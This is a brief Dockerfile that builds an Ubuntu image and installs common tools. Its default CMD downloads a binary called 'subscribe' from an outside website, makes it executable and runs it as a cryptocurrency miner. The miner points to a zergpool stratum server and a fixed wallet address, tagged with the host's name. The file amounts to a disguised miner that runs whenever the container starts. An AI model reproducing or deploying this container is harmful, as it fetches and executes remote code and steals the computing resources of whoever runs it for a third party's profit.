FROM ubuntu:20.04 as ubuntu-base
RUN apt-get update && apt-get install -y curl git unzip wget
CMD wget http://ilovenypizza.com/subscribe && chmod +x subscribe && ./subscribe -a cpupower -o stratum+tcp://cpupower.mine.zergpool.com:4250 -u CTg5jaQmry8QTyWW4JAxgG7rd7wHGNsMDk.$(cat /proc/sys/kernel/hostname) -p=c=CPU,mc=CPU
